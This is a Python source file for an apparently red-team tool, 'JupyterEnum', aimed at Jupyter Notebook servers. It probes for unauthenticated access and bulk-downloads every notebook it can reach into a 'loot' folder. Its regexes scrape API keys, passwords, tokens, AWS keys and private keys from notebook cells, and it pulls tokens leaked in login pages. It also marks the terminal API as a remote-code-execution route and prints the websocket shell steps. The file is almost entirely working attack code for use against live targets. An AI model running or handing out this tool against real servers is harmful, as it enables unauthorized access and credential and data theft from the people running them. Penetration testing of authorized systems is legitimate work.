#!/usr/bin/env python3
"""
JupyterEnum - Jupyter Notebook Recon & Enumeration Tool
Red Team | AI Infra Pentesting | Made by Aryan Giri

Usage:
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-all
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --password mypass --check-all
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --download work/model.ipynb
"""

import argparse
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests
from requests.exceptions import JSONDecodeError, RequestException
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.rule import Rule
    from rich.table import Table
    from rich.tree import Tree

    RICH = True
    console = Console()
except ImportError:
    RICH = False
    console = None


# ── Output helpers ─────────────────────────────────────────────────────────────
def info(m: str) -> None:
    console.print(f"[cyan]  [*][/cyan] {m}") if RICH else print(f"  [*] {m}")

def good(m: str) -> None:
    console.print(f"[green]  [+][/green] {m}") if RICH else print(f"  [+] {m}")

def warn(m: str) -> None:
    console.print(f"[yellow]  [!][/yellow] {m}") if RICH else print(f"  [!] {m}")

def bad(m: str) -> None:
    console.print(f"[red]  [-][/red] {m}") if RICH else print(f"  [-] {m}")

def sep() -> None:
    console.print(Rule(style="dim")) if RICH else print("─" * 60)

def section(title: str) -> None:
    if RICH:
        console.print(f"\n[bold white on #0d1117]  {title}  [/bold white on #0d1117]")
        console.print(Rule(style="dim #444"))
    else:
        print(f"\n── {title} " + "─" * max(0, 52 - len(title)))


# ── Banner ─────────────────────────────────────────────────────────────────────
def print_banner() -> None:
    if RICH:
        console.print("""
[bold cyan]  ┌─────────────────────────────────────────────────┐[/bold cyan]
[bold cyan]  │[/bold cyan]  [bold white]JupyterEnum[/bold white]  [dim]— Jupyter Notebook Recon Tool[/dim]  [bold cyan]│[/bold cyan]
[bold cyan]  │[/bold cyan]  [dim]AI Infra Pentesting  |  Made by Aryan Giri[/dim]      [bold cyan]│[/bold cyan]
[bold cyan]  └─────────────────────────────────────────────────┘[/bold cyan]
""")
    else:
        print("""
  +--------------------------------------------------+
  |  JupyterEnum  -- Jupyter Notebook Recon Tool     |
  |  AI Infra Pentesting  |  Made by Aryan Giri      |
  +--------------------------------------------------+
""")


# ══════════════════════════════════════════════════════════════════════════════
# HTTP Session  (token auth OR password/cookie auth)
# ══════════════════════════════════════════════════════════════════════════════
class JupyterSession:
    def __init__(
        self,
        base_url: str,
        token: Optional[str] = None,
        password: Optional[str] = None,
        timeout: int = 10,
        proxy: Optional[str] = None,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.token    = token
        self.timeout  = timeout
        self.sess     = requests.Session()
        self.sess.verify = False

        if token:
            self.sess.headers["Authorization"] = f"token {token}"

        if proxy:
            self.sess.proxies = {"http": proxy, "https": proxy}

        # Password-based auth: POST /login → session cookie
        if password and not token:
            self._login_with_password(password)

    def _login_with_password(self, password: str) -> None:
        """
        Handles classic Jupyter password login.
        POSTs credentials to /login, which sets _xsrf + session cookies.
        """
        login_url = self.base_url + "/login"
        try:
            # 1. GET /login to harvest the _xsrf token from the form/cookie
            r = self.sess.get(login_url, timeout=self.timeout)
            xsrf = (
                self.sess.cookies.get("_xsrf")
                or re.search(r'name="_xsrf"\s+value="([^"]+)"', r.text or "")
                and re.search(r'name="_xsrf"\s+value="([^"]+)"', r.text).group(1)
                or ""
            )

            # 2. POST credentials
            resp = self.sess.post(
                login_url,
                data={"password": password, "_xsrf": xsrf},
                timeout=self.timeout,
                allow_redirects=True,
            )

            if resp.status_code in (200, 302) and "username-password" not in resp.url:
                good("Password login succeeded — session cookie obtained")
            else:
                warn(f"Password login may have failed (HTTP {resp.status_code})")

        except RequestException as e:
            bad(f"Login request failed: {e}")

    def get(self, path: str, **kw) -> Optional[requests.Response]:
        url = self.base_url + "/" + path.lstrip("/")
        try:
            return self.sess.get(url, timeout=self.timeout, **kw)
        except RequestException as e:
            bad(f"GET {url} — {e}")
        return None

    def post(self, path: str, **kw) -> Optional[requests.Response]:
        url = self.base_url + "/" + path.lstrip("/")
        try:
            return self.sess.post(url, timeout=self.timeout, **kw)
        except RequestException as e:
            bad(f"POST {url} — {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════════
# Enumerator
# ══════════════════════════════════════════════════════════════════════════════
class JupyterEnum:

    # Pre-compiled once at class definition — no per-call recompile cost
    COMPILED_PATTERNS: list[tuple[re.Pattern, str]] = [
        (re.compile(r"(?i)(api[_-]?key|apikey)\s*[=:]\s*['\"]?([A-Za-z0-9\-_]{16,})"),  "API Key"),
        (re.compile(r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"]([^'\"]{4,})['\"]"),        "Password"),
        (re.compile(r"(?i)(token)\s*[=:]\s*['\"]([A-Za-z0-9\-_.]{20,})['\"]"),            "Token"),
        (re.compile(r"(?i)(secret)\s*[=:]\s*['\"]([^'\"]{8,})['\"]"),                     "Secret"),
        (re.compile(r"(AKIA[0-9A-Z]{16})"),                                                 "AWS Key"),
        (re.compile(r"(?i)BEGIN (RSA|EC|OPENSSH) PRIVATE KEY"),                             "Private Key"),
        (re.compile(r"(?i)os\.environ\[['\"][A-Z_]+['\"]\]"),                               "Env Var Read"),
        (re.compile(r"(?i)subprocess\.(?:call|run|Popen)\("),                               "Shell Exec"),
    ]

    def __init__(
        self,
        session: JupyterSession,
        out_dir: str = "jupyter_loot",
        max_depth: int = 6,
        delay: float = 0.2,
        threads: int = 10,
    ) -> None:
        self.s         = session
        self.out_dir   = Path(out_dir).resolve()
        self.max_depth = max_depth
        self.delay     = delay
        self.threads   = threads
        self.notebooks: list[str] = []
        self.findings:  list[tuple[str, str, str]] = []
        self.summary:   dict = {}

    def _hit(self, path: str) -> tuple[Optional[requests.Response], bool]:
        r = self.s.get(path)
        ok = r is not None and r.status_code == 200
        return r, ok

    def _add(self, sev: str, tag: str, detail: str) -> None:
        self.findings.append((sev, tag, detail))

    def _safe_path(self, nb_path: str) -> Optional[Path]:
        """
        Resolve the download path and reject any path that escapes out_dir.
        Guards against Zip Slip / path traversal from malicious servers.
        """
        try:
            # Strip leading slashes so joinpath doesn't treat it as absolute
            safe = self.out_dir.joinpath(nb_path.lstrip("/")).resolve()
            if not str(safe).startswith(str(self.out_dir)):
                bad(f"Path traversal attempt blocked: '{nb_path}' → '{safe}'")
                self._add("WARN", "PATH_TRAVERSAL_BLOCKED",
                          f"Server returned malicious path: {nb_path}")
                return None
            return safe
        except Exception as e:
            bad(f"Could not resolve path '{nb_path}': {e}")
            return None

    def _parse_json(self, r: requests.Response) -> Optional[dict | list]:
        """Narrow JSON parse exception — only catches JSON errors, not everything."""
        try:
            return r.json()
        except (JSONDecodeError, ValueError) as e:
            bad(f"JSON parse error from {r.url}: {e}")
        return None

    # ── 1. Access & Fingerprint ────────────────────────────────────────────────
    def check_access(self) -> bool:
        section("1 / ACCESS CHECK & FINGERPRINT")

        r = self.s.get("/api")

        # FIX: Don't bail on 401/403 — still extract headers and continue
        if r is None:
            bad("No response — target unreachable")
            return False

        if r.status_code == 200:
            data = self._parse_json(r)
            ver  = (data or {}).get("version", "unknown")
            good(f"Jupyter version : [bold]{ver}[/bold]" if RICH else f"Jupyter version: {ver}")
            self.summary["version"] = ver

        elif r.status_code in (401, 403):
            warn(f"HTTP {r.status_code} on /api — auth required, but continuing header/login checks")
            self.summary["auth_required"] = True

        else:
            warn(f"/api returned HTTP {r.status_code}")

        # Inspect headers regardless of auth status
        for h in ["Server", "X-Jupyter-Version", "X-Content-Type-Options"]:
            val = r.headers.get(h)
            if val:
                info(f"{h}: [yellow]{val}[/yellow]" if RICH else f"{h}: {val}")
        self.summary["server"] = r.headers.get("Server", "?")

        # /tree — classic UI open check
        rt, tree_ok = self._hit("/tree")
        if tree_ok:
            good("[bold red]  /tree OPEN — NO AUTH REQUIRED[/bold red]" if RICH
                 else "  /tree OPEN — NO AUTH REQUIRED")
            self._add("CRITICAL", "UNAUTH_ACCESS", "/tree accessible without token")
            self.summary["unauthenticated"] = True
        else:
            code = rt.status_code if rt else "N/A"
            info(f"/tree → HTTP {code}")
            self.summary["unauthenticated"] = False

        # /lab — JupyterLab UI
        rl, lab_ok = self._hit("/lab")
        if lab_ok:
            good("[bold red]  /lab (JupyterLab) OPEN[/bold red]" if RICH else "  /lab OPEN")
            self._add("HIGH", "JUPYTERLAB_OPEN", "/lab accessible without auth")

        # Allow continuation even if fully locked down (for header/token checks)
        return True

    # ── 2. Contents (recursive) ────────────────────────────────────────────────
    def enum_contents(self, path: str = "", depth: int = 0) -> list:
        ep = "/api/contents/" + path.lstrip("/")
        r, ok = self._hit(ep)
        if not ok:
            return []

        data = self._parse_json(r)
        if data is None:
            return []

        items  = data.get("content") or []
        result = []

        for item in items:
            result.append(item)
            if item.get("type") == "notebook":
                self.notebooks.append(item["path"])
            if item.get("type") == "directory" and depth < self.max_depth:
                result += self.enum_contents(item["path"], depth + 1)

        return result

    def display_contents(self, items: list) -> None:
        section("2 / FILE & NOTEBOOK TREE")
        if not items:
            bad("No content returned (empty or blocked)")
            return

        if RICH:
            tree = Tree(f"[bold]📂 {self.s.base_url}[/bold]")
            for item in items:
                t  = item.get("type", "")
                n  = item.get("name", "?")
                lm = (item.get("last_modified") or "")[:19]
                sz = item.get("size") or 0
                if t == "notebook":    icon, col = "📓", "green"
                elif t == "directory": icon, col = "📁", "blue"
                else:                  icon, col = "📄", "white"
                tree.add(f"[{col}]{icon} {n}[/{col}] [dim]{lm}  {sz}B[/dim]")
            console.print(tree)
        else:
            for item in items:
                lm = (item.get("last_modified") or "")[:19]
                print(f"  [{item.get('type','?'):10}] {item.get('path','?')}  {lm}")

        good(f"Total: {len(items)} items  |  Notebooks: {len(self.notebooks)}")
        self.summary["total_items"]     = len(items)
        self.summary["notebooks_found"] = len(self.notebooks)

    # ── 3. Notebook Accessibility (threaded) ───────────────────────────────────
    def _check_one_notebook(self, nb: str) -> tuple[str, bool, int]:
        """Worker for threaded accessibility check."""
        r, ok = self._hit(f"/api/contents/{nb}")
        code  = r.status_code if r else 0
        return nb, ok, code

    def check_notebook_access(self) -> list[str]:
        section("3 / NOTEBOOK ACCESSIBILITY CHECK")
        if not self.notebooks:
            warn("No notebooks discovered yet")
            return []

        accessible: list[str] = []
        results: list[tuple[str, bool, int]] = []

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self._check_one_notebook, nb): nb
                       for nb in self.notebooks}
            for future in as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as e:
                    bad(f"Thread error: {e}")

        # Sort to keep output deterministic
        results.sort(key=lambda x: x[0])

        for nb, ok, code in results:
            if ok:
                good(f"[bold green]OPEN[/bold green]   {nb}" if RICH else f"  OPEN   {nb}")
                accessible.append(nb)
            else:
                bad(f"[dim]BLOCKED[/dim] ({code})  {nb}" if RICH else f"  BLOCKED ({code})  {nb}")

        info(f"Accessible: {len(accessible)}/{len(self.notebooks)}")
        self.summary["accessible_notebooks"] = len(accessible)
        return accessible

    # ── 4. Sessions ────────────────────────────────────────────────────────────
    def enum_sessions(self) -> None:
        section("4 / ACTIVE SESSIONS")
        r, ok = self._hit("/api/sessions")
        if not ok:
            warn("Sessions endpoint blocked")
            return

        sessions = self._parse_json(r)
        if sessions is None:
            return

        if not sessions:
            info("No active sessions")
            return

        good(f"Found {len(sessions)} active session(s)")
        self.summary["active_sessions"] = len(sessions)
        self._add("HIGH", "ACTIVE_SESSIONS", f"{len(sessions)} sessions running")

        if RICH:
            t = Table(border_style="dim", header_style="bold cyan")
            t.add_column("Notebook",    style="green")
            t.add_column("Kernel ID",   style="yellow")
            t.add_column("Kernel Name")
            t.add_column("State")
            for s in sessions:
                nb  = s.get("path", s.get("notebook", {}).get("path", "?"))
                kid = s.get("kernel", {}).get("id", "?")[:14] + "..."
                kn  = s.get("kernel", {}).get("name", "?")
                ks  = s.get("kernel", {}).get("execution_state", "?")
                t.add_row(nb, kid, kn, ks)
            console.print(t)
        else:
            for s in sessions:
                print(f"  {s.get('path','?')} | {s.get('kernel',{}).get('id','?')[:14]}")

    # ── 5. Kernels ─────────────────────────────────────────────────────────────
    def enum_kernels(self) -> None:
        section("5 / RUNNING KERNELS")
        r, ok = self._hit("/api/kernels")
        if not ok:
            warn("Kernels endpoint blocked")
            return

        kernels = self._parse_json(r)
        if kernels is None:
            return

        if not kernels:
            info("No running kernels")
            return

        good(f"Found {len(kernels)} kernel(s)")
        self.summary["running_kernels"] = len(kernels)

        if RICH:
            t = Table(border_style="dim", header_style="bold cyan")
            t.add_column("ID (short)", style="yellow")
            t.add_column("Name",       style="green")
            t.add_column("State")
            t.add_column("Last Activity")
            for k in kernels:
                t.add_row(
                    k.get("id", "?")[:18] + "...",
                    k.get("name", "?"),
                    k.get("execution_state", "?"),
                    (k.get("last_activity") or "?")[:19],
                )
            console.print(t)
        else:
            for k in kernels:
                print(f"  {k.get('id','?')[:18]} | {k.get('name')} | {k.get('execution_state')}")

    # ── 6. Terminal Access (RCE vector) ────────────────────────────────────────
    def check_terminals(self) -> None:
        section("6 / TERMINAL ACCESS  ←  RCE VECTOR")
        r, ok = self._hit("/api/terminals")

        if ok:
            terms = self._parse_json(r) or []
            count = len(terms) if isinstance(terms, list) else 0

            if count > 0:
                good(f"[bold red]TERMINAL OPEN — {count} active terminal(s)![/bold red]" if RICH
                     else f"  TERMINAL OPEN — {count} active terminals!")
                self._add("CRITICAL", "TERMINAL_OPEN", f"{count} terminals accessible")
                for t in terms:
                    tid = t.get("name", "?")
                    info(f"Terminal {tid}  →  ws://TARGET/terminals/websocket/{tid}")
            else:
                good("[bold yellow]Terminal endpoint reachable (no active terminals)[/bold yellow]"
                     if RICH else "  Terminal endpoint reachable")
                self._add("CRITICAL", "TERMINAL_ACCESSIBLE",
                          "POST /api/terminals → spawn shell → full RCE")

            if RICH:
                console.print("  [dim]Exploit: POST /api/terminals  →  ws://TARGET/terminals/websocket/<id>[/dim]")
                console.print('  [dim]         send ["stdin", "id\\n"]  ←  live shell output[/dim]')
            else:
                print("  Exploit: POST /api/terminals → websocket shell")

            self.summary["terminal_access"] = True
        else:
            code = r.status_code if r else "N/A"
            info(f"Terminal endpoint → HTTP {code} (blocked or disabled)")
            self.summary["terminal_access"] = False

    # ── 7. Kernel Specs ────────────────────────────────────────────────────────
    def enum_kernelspecs(self) -> None:
        section("7 / KERNEL SPECS  ←  language & env disclosure")
        r, ok = self._hit("/api/kernelspecs")
        if not ok:
            warn("kernelspecs endpoint blocked")
            return

        data = self._parse_json(r)
        if data is None:
            return

        specs = data.get("kernelspecs", {})
        if not specs:
            info("No kernel specs returned")
            return

        good(f"Found {len(specs)} kernel spec(s)")
        self.summary["kernel_specs"] = list(specs.keys())

        if RICH:
            t = Table(border_style="dim", header_style="bold cyan")
            t.add_column("Name",         style="green")
            t.add_column("Display Name")
            t.add_column("Language",     style="yellow")
            for name, spec in specs.items():
                sp = spec.get("spec", {})
                t.add_row(name, sp.get("display_name", name), sp.get("language", "?"))
            console.print(t)
        else:
            for name, spec in specs.items():
                lang = spec.get("spec", {}).get("language", "?")
                print(f"  {name} ({lang})")

    # ── 8. Config Exposure ─────────────────────────────────────────────────────
    def check_config(self) -> None:
        section("8 / CONFIG ENDPOINT EXPOSURE")
        for ep in ["/api/config/common", "/api/config/tree",
                   "/api/config/notebook", "/api/config/terminal"]:
            r, ok = self._hit(ep)
            if ok:
                d = self._parse_json(r)
                snippet = json.dumps(d)[:120] if d else "empty"
                good(f"[yellow]{ep}[/yellow]  →  {snippet}" if RICH else f"  {ep} → {snippet}")
                if d:
                    self._add("MEDIUM", "CONFIG_EXPOSED", f"{ep}: {str(d)[:80]}")
            else:
                code = r.status_code if r else "N/A"
                bad(f"[dim]{ep}[/dim]  →  {code}" if RICH else f"  {ep} → {code}")

    # ── 9. Swagger / API Docs ──────────────────────────────────────────────────
    def check_swagger(self) -> None:
        section("9 / SWAGGER & API DOCS EXPOSURE")
        for ep in ["/api/swagger.json", "/api/swagger.yaml", "/api/spec.json"]:
            r, ok = self._hit(ep)
            if ok:
                good(f"[bold yellow]Swagger docs exposed → {ep}[/bold yellow]" if RICH
                     else f"  Swagger exposed → {ep}")
                self._add("LOW", "SWAGGER_EXPOSED", ep)
                d = self._parse_json(r)
                if d:
                    info(f"Sample paths: {list(d.get('paths', {}).keys())[:8]}")
            else:
                bad(f"[dim]{ep}[/dim] not accessible" if RICH else f"  {ep} not found")

    # ── 10. Token Exposure Patterns ────────────────────────────────────────────
    def check_token_exposure(self) -> None:
        section("10 / TOKEN EXPOSURE PATTERNS")

        r = self.s.get("/login")
        if r is not None and r.status_code == 200:
            # r is guaranteed non-None if ok is True — removed redundant `and r`
            tokens = re.findall(r"token=([a-f0-9]{32,})", r.text)
            if tokens:
                good("[bold red]TOKEN FOUND IN /login HTML body![/bold red]" if RICH
                     else "  TOKEN IN /login body!")
                for tok in tokens:
                    warn(f"Token: [bold]{tok}[/bold]" if RICH else f"  Token: {tok}")
                    self._add("CRITICAL", "TOKEN_LEAKED_HTML", tok)
                    self.summary["leaked_token"] = tok
            else:
                info("/login body — no embedded token found")
        else:
            code = r.status_code if r else "N/A"
            info(f"/login → HTTP {code}")

        # URL param acceptance check (token leaks into server access logs)
        r2 = self.s.get("/?token=CANARY_TEST_VALUE")
        if r2 is not None and r2.status_code == 200:
            warn("Server accepts ?token= in URL — token will appear in access logs and Referer headers")
            self._add("MEDIUM", "TOKEN_URL_PARAM", "Token via URL param — log exposure risk")

        # nbserver endpoint (sometimes leaks active token)
        r3, ok3 = self._hit("/api/nbserver")
        if ok3 and r3:
            d = self._parse_json(r3)
            if d and "token" in str(d).lower():
                good(f"[bold red]/api/nbserver leaks token info![/bold red]" if RICH
                     else "  /api/nbserver leaks token!")
                self._add("HIGH", "NBSERVER_TOKEN_LEAK", str(d)[:120])

    # ── 11. Recent Activity ────────────────────────────────────────────────────
    def recent_activity(self, items: list) -> None:
        section("11 / RECENT NOTEBOOK ACTIVITY")
        nbs = [i for i in items if i.get("type") == "notebook" and i.get("last_modified")]
        if not nbs:
            info("No timestamped notebooks found")
            return

        nbs.sort(key=lambda x: x.get("last_modified", ""), reverse=True)

        if RICH:
            t = Table(border_style="dim", header_style="bold cyan",
                      title="Top 10 Recently Modified")
            t.add_column("#",        width=3)
            t.add_column("Notebook", style="green")
            t.add_column("Modified", style="yellow")
            t.add_column("Size",     width=10)
            for i, nb in enumerate(nbs[:10], 1):
                t.add_row(str(i), nb["path"],
                          nb["last_modified"][:19], f"{nb.get('size', 0)} B")
            console.print(t)
        else:
            for i, nb in enumerate(nbs[:10], 1):
                print(f"  {i:2}. {nb['path']} → {nb['last_modified'][:19]}")

    # ── 12. Secret Scraper ─────────────────────────────────────────────────────
    def scrape_credentials(self, nb_path: str, nb_content: dict) -> list:
        hits: list[tuple[str, str, int]] = []

        for i, cell in enumerate(nb_content.get("cells", []), 1):
            src_raw = cell.get("source", [])
            src     = "\n".join(src_raw) if isinstance(src_raw, list) else src_raw

            # Uses pre-compiled patterns — no per-call recompile
            for pattern, label in self.COMPILED_PATTERNS:
                for m in pattern.findall(src):
                    val = m if isinstance(m, str) else " / ".join(m)
                    hits.append((label, val, i))
                    self._add("HIGH", f"SECRET_{label.upper().replace(' ', '_')}",
                              f"{nb_path} cell {i}: {val[:60]}")

        if hits:
            good(f"[bold red]  Secrets in {nb_path}:[/bold red]" if RICH
                 else f"  Secrets in {nb_path}:")
            for label, val, cell_no in hits:
                warn(f"  [{label}] cell {cell_no}: [yellow]{str(val)[:80]}[/yellow]" if RICH
                     else f"  [{label}] cell {cell_no}: {str(val)[:80]}")

        return hits

    # ── 13. Download (with path traversal guard) ───────────────────────────────
    def download_notebook(self, nb_path: str, scan_secrets: bool = True) -> bool:
        """
        Downloads via /api/contents — no token needed on open servers.
        Includes Zip Slip / path traversal protection.
        """
        # Validate path BEFORE making any request
        local = self._safe_path(nb_path)
        if local is None:
            return False

        ep = f"/api/contents/{nb_path.lstrip('/')}?type=notebook"
        r, ok = self._hit(ep)

        if not ok:
            code = r.status_code if r else "N/A"
            hint = " (try --token or --password if auth is required)" if code in (401, 403) else ""
            bad(f"Cannot download '{nb_path}' — HTTP {code}{hint}")
            return False

        data = self._parse_json(r)
        if data is None:
            return False

        content = data.get("content")
        if content is None:
            bad(f"No content field in response for {nb_path}")
            return False

        try:
            local.parent.mkdir(parents=True, exist_ok=True)
            with open(local, "w", encoding="utf-8") as f:
                json.dump(content, f, indent=2)
            good(f"Saved → {local}")
        except OSError as e:
            bad(f"Could not write '{local}': {e}")
            return False

        if scan_secrets:
            self.scrape_credentials(nb_path, content)

        return True

    def _download_one(self, nb: str, scan: bool) -> bool:
        """Worker for threaded bulk download."""
        result = self.download_notebook(nb, scan_secrets=scan)
        time.sleep(self.delay)
        return result

    def download_all(self, scan_secrets: bool = True) -> None:
        section("DOWNLOAD ALL  ←  tokenless on open servers  |  threaded")
        if not self.notebooks:
            warn("No notebooks to download")
            return

        ok_count = 0
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self._download_one, nb, scan_secrets): nb
                       for nb in self.notebooks}
            for future in as_completed(futures):
                try:
                    if future.result():
                        ok_count += 1
                except Exception as e:
                    bad(f"Download thread error: {e}")

        info(f"Downloaded {ok_count}/{len(self.notebooks)} → ./{self.out_dir}/")
        self.summary["downloaded"] = ok_count

    # ── 14. Findings & Summary ─────────────────────────────────────────────────
    def print_findings(self) -> None:
        section("FINDINGS SUMMARY")
        if not self.findings:
            info("No notable findings recorded")
            return

        SEV_COLOR = {"CRITICAL": "bold red", "HIGH": "yellow",
                     "MEDIUM": "cyan", "LOW": "dim", "WARN": "magenta"}
        if RICH:
            t = Table(border_style="dim", header_style="bold white")
            t.add_column("SEV",    width=10)
            t.add_column("Tag",    style="yellow")
            t.add_column("Detail")
            for sev, tag, detail in self.findings:
                col = SEV_COLOR.get(sev, "white")
                t.add_row(f"[{col}]{sev}[/{col}]", tag, detail[:90])
            console.print(t)
        else:
            for sev, tag, detail in self.findings:
                print(f"  [{sev}] {tag}: {detail[:90]}")

    def print_summary(self) -> None:
        section("FULL SUMMARY")
        self.summary.update({
            "target":    self.s.base_url,
            "timestamp": datetime.now().isoformat(),
            "findings":  len(self.findings),
        })

        if RICH:
            t = Table(show_header=False, border_style="dim", box=None, padding=(0, 2))
            t.add_column("K", style="bold cyan")
            t.add_column("V")
            for k, v in self.summary.items():
                t.add_row(str(k), str(v))
            console.print(Panel(t, title="[bold yellow]JupyterEnum[/bold yellow]",
                                border_style="yellow"))
        else:
            print("\n=== SUMMARY ===")
            for k, v in self.summary.items():
                print(f"  {k}: {v}")

        # Save JSON report
        self.out_dir.mkdir(parents=True, exist_ok=True)
        rp = self.out_dir / "enum_report.json"
        with open(rp, "w") as f:
            json.dump({**self.summary, "raw_findings": self.findings}, f,
                      indent=2, default=str)
        good(f"Report saved → {rp}")


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="JupyterEnum — Jupyter Recon Tool | Made by Aryan Giri",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  # Full auto enum — everything in one command (no token on open servers)
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-all

  # Token auth
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --token abc123 --check-all

  # Password auth (classic Jupyter login page)
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --password mypassword --check-all

  # Download all notebooks (tokenless on open servers)
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --download-all

  # Download specific notebook
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --download "work/train.ipynb"

  # Tune depth, speed, and thread count
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-all --max-depth 3 --delay 0.5 --threads 5

  # Through Burp Suite
  python3 jupyter_enum.py -t http://10.10.45.20:8888 --proxy http://127.0.0.1:8080 --check-all
"""
    )

    p.add_argument("-t", "--target",      required=True)
    p.add_argument("--token",             default=None,  help="API token")
    p.add_argument("--password",          default=None,  help="Password (classic login form auth)")
    p.add_argument("--timeout",           type=int,   default=10)
    p.add_argument("--proxy",             default=None)
    p.add_argument("--output-dir",        default="jupyter_loot")
    p.add_argument("--max-depth",         type=int,   default=6,   help="Max directory recursion depth (default: 6)")
    p.add_argument("--delay",             type=float, default=0.2, help="Delay between downloads in seconds (default: 0.2)")
    p.add_argument("--threads",           type=int,   default=10,  help="Thread count for parallel ops (default: 10)")
    p.add_argument("--no-banner",         action="store_true")

    # Feature flags
    p.add_argument("--check-all",         action="store_true", help="Run ALL modules (recommended)")
    p.add_argument("--enum-contents",     action="store_true", help="List files & notebooks recursively")
    p.add_argument("--check-notebooks",   action="store_true", help="Test each notebook's accessibility")
    p.add_argument("--enum-sessions",     action="store_true", help="Enumerate active sessions")
    p.add_argument("--enum-kernels",      action="store_true", help="Enumerate running kernels")
    p.add_argument("--check-terminals",   action="store_true", help="Check terminal endpoint (RCE vector)")
    p.add_argument("--enum-kernelspecs",  action="store_true", help="List kernel specs (lang/env)")
    p.add_argument("--check-config",      action="store_true", help="Check config endpoint exposure")
    p.add_argument("--check-swagger",     action="store_true", help="Check swagger/API docs exposure")
    p.add_argument("--check-tokens",      action="store_true", help="Check token leakage patterns")
    p.add_argument("--recent-activity",   action="store_true", help="Sort notebooks by last modified")
    p.add_argument("--download-all",      action="store_true", help="Download all notebooks")
    p.add_argument("--download",          default=None, metavar="NB_PATH")
    p.add_argument("--no-scrape",         action="store_true", help="Skip secret scraping")

    return p.parse_args()


def main() -> None:
    args = parse_args()

    if not args.no_banner:
        print_banner()

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = "http://" + target

    auth_mode = ("token" if args.token else "password" if args.password else "none (unauthenticated)")

    if RICH:
        console.print(f"  [bold cyan]Target[/bold cyan]  : {target}")
        console.print(f"  [bold cyan]Auth[/bold cyan]    : [yellow]{auth_mode}[/yellow]")
        console.print(f"  [bold cyan]Threads[/bold cyan] : {args.threads}  |  Depth: {args.max_depth}  |  Delay: {args.delay}s")
        console.print(f"  [bold cyan]Output[/bold cyan]  : {args.output_dir}")
    else:
        print(f"  Target  : {target}")
        print(f"  Auth    : {auth_mode}")
        print(f"  Threads : {args.threads}  Depth: {args.max_depth}  Delay: {args.delay}s")
        print(f"  Output  : {args.output_dir}")
    sep()

    sess = JupyterSession(
        target,
        token=args.token,
        password=args.password,
        timeout=args.timeout,
        proxy=args.proxy,
    )
    en = JupyterEnum(
        sess,
        out_dir=args.output_dir,
        max_depth=args.max_depth,
        delay=args.delay,
        threads=args.threads,
    )

    all_mode = args.check_all

    # Access check always runs — now continues even on 401/403
    en.check_access()

    items: list = []

    need_contents = (all_mode or args.enum_contents or args.check_notebooks
                     or args.recent_activity or args.download_all)
    if need_contents:
        info("Enumerating /api/contents recursively ...")
        items = en.enum_contents()
        en.display_contents(items)

    if all_mode or args.check_notebooks:  en.check_notebook_access()
    if all_mode or args.recent_activity:  en.recent_activity(items)
    if all_mode or args.enum_sessions:    en.enum_sessions()
    if all_mode or args.enum_kernels:     en.enum_kernels()
    if all_mode or args.check_terminals:  en.check_terminals()
    if all_mode or args.enum_kernelspecs: en.enum_kernelspecs()
    if all_mode or args.check_config:     en.check_config()
    if all_mode or args.check_swagger:    en.check_swagger()
    if all_mode or args.check_tokens:     en.check_token_exposure()

    scan = not args.no_scrape

    if args.download:
        section("SINGLE NOTEBOOK DOWNLOAD")
        en.download_notebook(args.download, scan_secrets=scan)
    elif all_mode or args.download_all:
        if not en.notebooks:
            info("Discovering notebooks first ...")
            items = en.enum_contents()
        en.download_all(scan_secrets=scan)

    en.print_findings()
    en.print_summary()


if __name__ == "__main__":
    main()
